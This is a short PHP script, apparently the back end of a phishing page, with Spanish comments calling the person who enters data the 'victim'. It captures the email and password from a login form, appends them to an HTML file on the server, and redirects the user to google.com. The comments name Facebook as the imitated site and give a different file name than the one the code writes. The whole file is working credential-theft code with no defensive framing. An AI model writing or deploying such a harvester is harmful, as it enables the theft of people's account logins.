<?
/*
Este archivo es el que procesa todos los datos de la victima y lo guarda en un archivo (leeme.html <- Aqui se guardaran los datos).
*/

#haxor.php
// Asigna el valor a las variables del usuario y contraseña
$usuario = $_POST['email'];
$contraseña = $_POST['password'];
//Asigna el valor a la variable donde se guarda el usuario y contraseña
$guardame = fopen('biomatrixdata.html','a+');
fwrite($guardame,
"<br/><b>Usuario:</b>".$usuario.
"<br/><b>Contrasena:</b>".$contraseña." ");

fclose($guardame);
//Redirecciona a la web original (facebook)
echo "<meta http-equiv='refresh' content='1;url=http://www.google.com'>"
?> 